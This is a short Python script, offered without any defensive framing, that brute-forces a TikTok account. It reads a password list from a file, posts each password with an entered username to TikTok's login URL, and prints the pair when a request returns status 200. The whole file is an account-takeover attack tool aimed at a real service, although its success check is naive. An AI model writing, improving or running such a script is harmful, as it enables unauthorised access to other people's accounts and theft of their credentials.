import requests

def brute_force_login(username):
    with open("passlist.txt", "r") as password_file:
        passwords = password_file.readlines()

    for password in passwords:
        password = password.strip()
        login_data = {
            "username": username,
            "password": password
        }
        response = requests.post("https://www.tiktok.com/login/", data=login_data)

        if response.status_code == 200:
            print("Login successful!")
            print("Username:", username)
            print("Password:", password)
            break

    print("Brute force attack completed.")

# Usage example
username = input("Enter the username: ")
brute_force_login(username)
